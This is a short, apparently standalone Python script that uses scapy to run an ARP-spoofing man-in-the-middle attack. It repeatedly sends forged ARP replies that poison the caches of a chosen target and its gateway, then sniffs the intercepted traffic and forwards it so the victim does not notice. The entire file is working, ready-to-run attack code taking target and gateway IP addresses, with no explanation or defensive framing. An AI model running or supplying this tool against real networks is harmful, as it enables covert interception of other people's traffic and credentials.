import argparse
from time import sleep
import scapy.all as scapy
import threading


def get_mac(ip):
    ans, _ = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff') /
                       scapy.ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    else:
        raise ValueError("unable to to find mac address")


def forward(packet, mac_dic):
    if (packet.haslayer(scapy.IP)):
        packet[scapy.Ether].dst = mac_dic.get(packet[scapy.IP].dst)
        scapy.sendp(packet, verbose=0)


def arp_thread(target_ip, gateway_ip, target_mac, gateway_mac):
    while True:
        scapy.send(scapy.ARP(op='is-at', psrc=gateway_ip,
                             pdst=target_ip, hwdst=target_mac), verbose=0)
        scapy.send(scapy.ARP(op='is-at', psrc=target_ip,
                             pdst=gateway_ip, hwdst=gateway_mac), verbose=0)
        sleep(1)


def sniff_thread(target_ip, gateway_ip, target_mac, gateway_mac):
    mac_dic = {gateway_ip: gateway_mac, target_ip: target_mac}
    attacker_mac = scapy.Ether().src
    scapy.sniff(
        filter=f"(ip and host {target_ip} and ether src {gateway_mac} or ether src {target_mac}) and ether dst {attacker_mac}",
        prn=lambda x: forward(x, mac_dic)
    )


def main(args):
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    threading.Thread(target=arp_thread, args=(
        target_ip, gateway_ip, target_mac, gateway_mac)).start()
    threading.Thread(target=sniff_thread, args=(
        target_ip, gateway_ip, target_mac, gateway_mac)).start()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target_ip")
    parser.add_argument("gateway_ip")
    args = parser.parse_args()
    main(args)
